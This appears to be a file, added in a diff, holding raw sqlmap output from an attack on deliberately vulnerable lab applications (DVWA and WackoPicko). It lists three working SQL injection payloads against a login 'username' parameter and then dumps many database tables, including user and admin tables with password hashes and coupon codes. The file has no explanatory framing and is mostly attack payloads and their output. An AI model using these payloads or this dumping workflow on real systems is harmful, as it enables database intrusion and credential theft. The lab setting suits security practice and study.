@@ -1,0 +1,348 @@
+sqlmap identified the following injection point(s) with a total of 295 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: username=-1719' OR 6061=6061#&password=
+
+    Type: error-based
+    Title: MySQL OR error-based - WHERE or HAVING clause
+    Payload: username=-1497' OR 1 GROUP BY CONCAT(0x716a6b6a71,(SELECT (CASE WHEN (8483=8483) THEN 1 ELSE 0 END)),0x7171717171,FLOOR(RAND(0)*2)) HAVING MIN(0)#&password=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
+    Payload: username=UyAZ' AND (SELECT * FROM (SELECT(SLEEP(5)))JJKc)#&password=
+---
+web application technology: PHP 5.6.2, Apache 2.2.29
+back-end DBMS: MySQL 5.0.12
+Database: performance_schema
+Table: performance_timers
+[5 entries]
++-------------+----------------+-----------------+------------------+
+| TIMER_NAME  | TIMER_OVERHEAD | TIMER_FREQUENCY | TIMER_RESOLUTION |
++-------------+----------------+-----------------+------------------+
+| CYCLE       | NULL           | NULL            | NULL             |
+| NANOSECOND  | NULL           | NULL            | NULL             |
+| MICROSECOND | NULL           | NULL            | NULL             |
+| MILLISECOND | NULL           | NULL            | NULL             |
+| TICK        | NULL           | NULL            | NULL             |
++-------------+----------------+-----------------+------------------+
+
+Database: performance_schema
+Table: events_waits_summary_by_thread_by_event_name
+[0 entries]
++-----------+------------+------------+----------------+----------------+----------------+----------------+
+| THREAD_ID | EVENT_NAME | COUNT_STAR | AVG_TIMER_WAIT | SUM_TIMER_WAIT | MAX_TIMER_WAIT | MIN_TIMER_WAIT |
++-----------+------------+------------+----------------+----------------+----------------+----------------+
++-----------+------------+------------+----------------+----------------+----------------+----------------+
+
+Database: performance_schema
+Table: events_waits_history
+[0 entries]
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+| EVENT_ID | THREAD_ID | NESTING_EVENT_ID | FLAGS | SPINS | SOURCE | TIMER_END | OPERATION | EVENT_NAME | TIMER_WAIT | OBJECT_TYPE | OBJECT_NAME | TIMER_START | OBJECT_SCHEMA | NUMBER_OF_BYTES | OBJECT_INSTANCE_BEGIN |
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+
+Database: performance_schema
+Table: cond_instances
+[0 entries]
++------+-----------------------+
+| NAME | OBJECT_INSTANCE_BEGIN |
++------+-----------------------+
++------+-----------------------+
+
+Database: performance_schema
+Table: setup_timers
+[1 entry]
++------+------------+
+| NAME | TIMER_NAME |
++------+------------+
+| wait | CYCLE      |
++------+------------+
+
+Database: performance_schema
+Table: file_summary_by_instance
+[0 entries]
++-----------+------------+------------+-------------+--------------------------+---------------------------+
+| FILE_NAME | EVENT_NAME | COUNT_READ | COUNT_WRITE | SUM_NUMBER_OF_BYTES_READ | SUM_NUMBER_OF_BYTES_WRITE |
++-----------+------------+------------+-------------+--------------------------+---------------------------+
++-----------+------------+------------+-------------+--------------------------+---------------------------+
+
+Database: performance_schema
+Table: file_instances
+[0 entries]
++-----------+------------+------------+
+| FILE_NAME | EVENT_NAME | OPEN_COUNT |
++-----------+------------+------------+
++-----------+------------+------------+
+
+Database: performance_schema
+Table: setup_instruments
+[0 entries]
++------+-------+---------+
+| NAME | TIMED | ENABLED |
++------+-------+---------+
++------+-------+---------+
+
+Database: performance_schema
+Table: file_summary_by_event_name
+[0 entries]
++------------+------------+-------------+--------------------------+---------------------------+
+| COUNT_READ | EVENT_NAME | COUNT_WRITE | SUM_NUMBER_OF_BYTES_READ | SUM_NUMBER_OF_BYTES_WRITE |
++------------+------------+-------------+--------------------------+---------------------------+
++------------+------------+-------------+--------------------------+---------------------------+
+
+Database: performance_schema
+Table: mutex_instances
+[0 entries]
++---------------------+------+-----------------------+
+| LOCKED_BY_THREAD_ID | NAME | OBJECT_INSTANCE_BEGIN |
++---------------------+------+-----------------------+
++---------------------+------+-----------------------+
+
+Database: performance_schema
+Table: threads
+[0 entries]
++-----------+----------------+------+
+| THREAD_ID | PROCESSLIST_ID | NAME |
++-----------+----------------+------+
++-----------+----------------+------+
+
+Database: performance_schema
+Table: rwlock_instances
+[0 entries]
++---------------------------+------+----------------------+-----------------------+
+| WRITE_LOCKED_BY_THREAD_ID | NAME | READ_LOCKED_BY_COUNT | OBJECT_INSTANCE_BEGIN |
++---------------------------+------+----------------------+-----------------------+
++---------------------------+------+----------------------+-----------------------+
+
+Database: performance_schema
+Table: setup_consumers
+[8 entries]
++----------------------------------------------+---------+
+| NAME                                         | ENABLED |
++----------------------------------------------+---------+
+| events_waits_current                         | YES     |
+| events_waits_history                         | YES     |
+| events_waits_history_long                    | YES     |
+| events_waits_summary_by_event_name           | YES     |
+| events_waits_summary_by_instance             | YES     |
+| events_waits_summary_by_thread_by_event_name | YES     |
+| file_summary_by_event_name                   | YES     |
+| file_summary_by_instance                     | YES     |
++----------------------------------------------+---------+
+
+Database: performance_schema
+Table: events_waits_summary_by_instance
+[0 entries]
++------------+------------+----------------+----------------+----------------+----------------+-----------------------+
+| EVENT_NAME | COUNT_STAR | AVG_TIMER_WAIT | SUM_TIMER_WAIT | MAX_TIMER_WAIT | MIN_TIMER_WAIT | OBJECT_INSTANCE_BEGIN |
++------------+------------+----------------+----------------+----------------+----------------+-----------------------+
++------------+------------+----------------+----------------+----------------+----------------+-----------------------+
+
+Database: performance_schema
+Table: events_waits_summary_global_by_event_name
+[0 entries]
++------------+------------+----------------+----------------+----------------+----------------+
+| EVENT_NAME | COUNT_STAR | AVG_TIMER_WAIT | SUM_TIMER_WAIT | MAX_TIMER_WAIT | MIN_TIMER_WAIT |
++------------+------------+----------------+----------------+----------------+----------------+
++------------+------------+----------------+----------------+----------------+----------------+
+
+Database: performance_schema
+Table: events_waits_current
+[0 entries]
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+| EVENT_ID | THREAD_ID | NESTING_EVENT_ID | FLAGS | SPINS | SOURCE | TIMER_END | OPERATION | EVENT_NAME | TIMER_WAIT | OBJECT_TYPE | OBJECT_NAME | TIMER_START | OBJECT_SCHEMA | NUMBER_OF_BYTES | OBJECT_INSTANCE_BEGIN |
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+
+Database: performance_schema
+Table: events_waits_history_long
+[0 entries]
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+| EVENT_ID | THREAD_ID | NESTING_EVENT_ID | FLAGS | SPINS | SOURCE | TIMER_END | OPERATION | EVENT_NAME | TIMER_WAIT | OBJECT_TYPE | OBJECT_NAME | TIMER_START | OBJECT_SCHEMA | NUMBER_OF_BYTES | OBJECT_INSTANCE_BEGIN |
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+
+Database: dvwa
+Table: users
+[5 entries]
++---------+--------------------------------------------------+---------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | avatar                                           | user    | password                         | last_name | first_name | last_login          | failed_login |
++---------+--------------------------------------------------+---------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | http://localhost/DVWA/hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2015-11-06 14:29:07 | 0            |
+| 2       | http://localhost/DVWA/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2015-11-06 14:17:41 | 0            |
+| 3       | http://localhost/DVWA/hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2015-11-06 14:17:41 | 0            |
+| 4       | http://localhost/DVWA/hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2015-11-06 14:17:41 | 0            |
+| 5       | http://localhost/DVWA/hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2015-11-06 14:17:41 | 0            |
++---------+--------------------------------------------------+---------+----------------------------------+-----------+------------+---------------------+--------------+
+
+Database: dvwa
+Table: guestbook
+[1 entry]
++------------+------+-------------------------+
+| comment_id | name | comment                 |
++------------+------+-------------------------+
+| 1          | test | This is a test comment. |
++------------+------+-------------------------+
+
+Database: wackopicko
+Table: cart
+[0 entries]
++----+---------+------------+
+| id | user_id | created_on |
++----+---------+------------+
++----+---------+------------+
+
+Database: wackopicko
+Table: admin_session
+[1 entry]
++----+----------+---------------------+
+| id | admin_id | created_on          |
++----+----------+---------------------+
+| 3  | 1        | 2016-01-05 12:00:06 |
++----+----------+---------------------+
+
+Database: wackopicko
+Table: own
+[3 entries]
++----+---------+------------+
+| id | user_id | picture_id |
++----+---------+------------+
+| 1  | 2       | 3          |
+| 2  | 2       | 2          |
+| 3  | 11      | 10         |
++----+---------+------------+
+
+Database: wackopicko
+Table: users
+[10 entries]
++----+------+---------------+----------+----------+------------------------------------------+-----------+---------------------+---------------------+
+| id | salt | login         | lastname | tradebux | password                                 | firstname | created_on          | last_login_on       |
++----+------+---------------+----------+----------+------------------------------------------+-----------+---------------------+---------------------+
+| 1  | NjM2 | Sample User   | User     | 130      | 3e912f8fc814831804d735dc2fcbc3cfa75c28e3 | Sample    | 2009-01-05 14:29:00 | 2016-01-05 12:18:22 |
+| 2  | Mjkx | bob           | Gilbert  | 96       | abd09072e674720d87ddd27122f67eedbc4b0d08 | I Am Bob  | 2009-01-05 14:51:05 | 2009-02-18 14:54:26 |
+| 4  | ODUy | scanner1      | 1        | 100      | af256af3d4fda990dbe546daa04e5c75eae356ea | Scanner   | 2009-02-18 14:46:21 | 2009-02-18 14:46:21 |
+| 5  | MzI5 | scanner2      | 2        | 100      | f9335d39b2b78018c2b8affa7fc7b0917a3300a7 | Scanner   | 2009-02-18 14:46:34 | 2009-02-18 14:46:34 |
+| 6  | Nzk3 | scanner3      | 3        | 100      | 43754746b4043c852864bb321e4f2648d1421c18 | Scanner   | 2009-02-18 14:46:51 | 2009-02-18 14:46:51 |
+| 7  | NjEx | scanner4      | 4        | 100      | e514a672396679528c766a92a857eac4b22bc667 | Number    | 2009-02-18 14:47:04 | 2009-02-18 14:47:04 |
+| 8  | NTQw | scanner5      | 5        | 100      | f38ae9b0b6b1ad2a2a2721841c0cc89b31e044cb | Number    | 2009-02-18 14:47:18 | 2009-02-18 14:47:18 |
+| 9  | Nzcz | wanda         | Granat   | 100      | 4e4465300b14b314384a6375a837f0532822d3c8 | Wanda     | 2009-02-18 14:53:23 | 2009-02-18 14:53:23 |
+| 10 | Nzc5 | calvinwatters | Watters  | 100      | 81418ed6e9bd15076d2f43e17b9f5a27c7e55ef7 | Calvin    | 2009-02-18 14:56:11 | 2009-02-18 14:56:11 |
+| 11 | NjY3 | bryce         | Boe      | 74       | 478fb0b83851b3d16ffc5a2554a4d616f1235156 | Bryce     | 2009-02-18 14:57:36 | 2009-02-18 14:57:36 |
++----+------+---------------+----------+----------+------------------------------------------+-----------+---------------------+---------------------+
+
+Database: wackopicko
+Table: guestbook
+[5 entries]
++----+------+-----------------------+---------------------+
+| id | name | comment               | created_on          |
++----+------+-----------------------+---------------------+
+| 1  | adam | Hi, I love your site! | 2008-12-02 19:32:53 |
+| 20 | xfak | 2168                  | 2016-01-05 12:18:19 |
+| 21 | xfak | 6347                  | 2016-01-05 12:18:19 |
+| 22 | xfak | "''""'))")            | 2016-01-05 12:18:19 |
+| 23 | xfak | 'dLJB<'">CGYt         | 2016-01-05 12:18:19 |
++----+------+-----------------------+---------------------+
+
+Database: wackopicko
+Table: admin
+[5 entries]
++----+-------+------------------------------------------+
+| id | login | password                                 |
++----+-------+------------------------------------------+
+| 1  | admin | d033e22ae348aeb5660fc2140aec35850c4da997 |
+| 2  | adamd | c533607326f2b815a7c23701be52989dac8bdbb1 |
+| 3  | admin | d033e22ae348aeb5660fc2140aec35850c4da997 |
+| 4  | adam  | 0ace61762d02afdf98f793d98c37edf696b675b2 |
+| 5  | bob   | 42a9037223cdbfe0c49ef0032f0a1f3392af3fe3 |
++----+-------+------------------------------------------+
+
+Database: wackopicko
+Table: pictures
+[9 entries]
++----+-------+---------+-----------+-----------------------------+-------+--------+---------------------+---------------------+--------------+
+| id | width | user_id | tag       | title                       | price | height | filename            | created_on          | high_quality |
++----+-------+---------+-----------+-----------------------------+-------+--------+---------------------+---------------------+--------------+
+| 7  | 128   | 1       | doggie    | My Dog                      | 15    | 128    | doggie/Dog.jpg      | 2009-02-18 14:50:30 | OTA5MjA1NA== |
+| 8  | 128   | 9       | toga      | Me and the Girls            | 10    | 128    | toga/togas          | 2009-02-18 14:53:48 | MTc3Mjgx     |
+| 9  | 128   | 9       | toga      | The Boys - In costume       | 20    | 128    | toga/togasfs        | 2009-02-18 14:54:13 | MTk1NDMxOQ== |
+| 10 | 128   | 2       | flowers   | Awesome Flower Pic          | 26    | 128    | flowers/flowers     | 2009-02-18 14:54:56 | NjE4NDgwOQ== |
+| 11 | 128   | 2       | house     | My House!                   | 16    | 128    | house/My_House      | 2009-02-18 14:55:20 | ODExNzIzOQ== |
+| 12 | 128   | 10      | waterfall | Beautiful Waterfall         | 10    | 128    | waterfall/Waterfall | 2009-02-18 14:56:47 | ODQ4OTkx     |
+| 13 | 128   | 10      | house     | Our House                   | 30    | 128    | house/our_house     | 2009-02-18 14:57:18 | OTE4MzM1Mw== |
+| 14 | 128   | 11      | house     | The house I share           | 20    | 128    | house/hodjjgld      | 2009-02-18 14:57:58 | MzM4OTU3MA== |
+| 15 | 128   | 11      | flowers   | This grows outside my house | 40    | 128    | flowers/flweofoee   | 2009-02-18 14:58:33 | ODcxNDAyNA== |
++----+-------+---------+-----------+-----------------------------+-------+--------+---------------------+---------------------+--------------+
+
+Database: wackopicko
+Table: comments_preview
+[11 entries]
++----+---------+------------+-------------------------------------------+---------------------+
+| id | user_id | picture_id | text                                      | created_on          |
++----+---------+------------+-------------------------------------------+---------------------+
+| 1  | 2       | 3          | blah.\t                                   | 2009-01-12 19:01:49 |
+| 2  | 2       | 3          | blah.\t                                   | 2009-01-12 19:02:12 |
+| 3  | 2       | 3          | blah.\t                                   | 2009-01-12 19:02:52 |
+| 4  | 2       | 3          | blah.\t                                   | 2009-01-12 19:05:45 |
+| 5  | 2       | 3          | You suck. Should I use this?\t            | 2009-01-12 19:06:43 |
+| 6  | 2       | 2          | That\\'s an awesome butt...               | 2009-01-12 19:21:40 |
+| 7  | 2       | 2          | That\\'s an awesome butt...               | 2009-01-12 19:25:52 |
+| 8  | 2       | 2          | That\\'s an awesome butt...               | 2009-01-12 19:26:21 |
+| 9  | 2       | 5          | \t      test                              | 2009-01-21 15:06:05 |
+| 11 | 2       | 5          | \t      testing                           | 2009-01-21 15:32:44 |
+| 12 | 2       | 11         | This is my house, what do you guys think? | 2009-02-18 14:55:39 |
++----+---------+------------+-------------------------------------------+---------------------+
+
+Database: wackopicko
+Table: cart_items
+[0 entries]
++----+---------+------------+
+| id | cart_id | picture_id |
++----+---------+------------+
++----+---------+------------+
+
+Database: wackopicko
+Table: comments
+[4 entries]
++----+---------+------------+-------------------------------------------+---------------------+
+| id | user_id | picture_id | text                                      | created_on          |
++----+---------+------------+-------------------------------------------+---------------------+
+| 1  | 2       | 3          | blah.\t                                   | 2009-01-12 19:05:45 |
+| 2  | 2       | 2          | That\\'s an awesome butt...               | 2009-01-12 19:26:21 |
+| 3  | 2       | 5          | \t      testing                           | 2009-01-21 15:32:44 |
+| 4  | 2       | 11         | This is my house, what do you guys think? | 2009-02-18 14:55:39 |
++----+---------+------------+-------------------------------------------+---------------------+
+
+Database: wackopicko
+Table: conflict_pictures
+[0 entries]
++----+---------+---------+----------+-----------+--------------+---------------+
+| id | user_id | new_tag | new_name | new_price | new_filename | orig_filename |
++----+---------+---------+----------+-----------+--------------+---------------+
++----+---------+---------+----------+-----------+--------------+---------------+
+
+Database: wackopicko
+Table: cart_coupons
+[5 entries]
++---------+-----------+
+| cart_id | coupon_id |
++---------+-----------+
+| 0       | 0         |
+| 2       | 1         |
+| 2       | 1         |
+| 2       | 1         |
+| 3       | 1         |
++---------+-----------+
+
+Database: wackopicko
+Table: coupons
+[2 entries]
++----+------------+----------+
+| id | code       | discount |
++----+------------+----------+
+| 1  | SUPERYOU21 | 90       |
+| 2  | SUPERYOU21 | 90       |
++----+------------+----------+
+
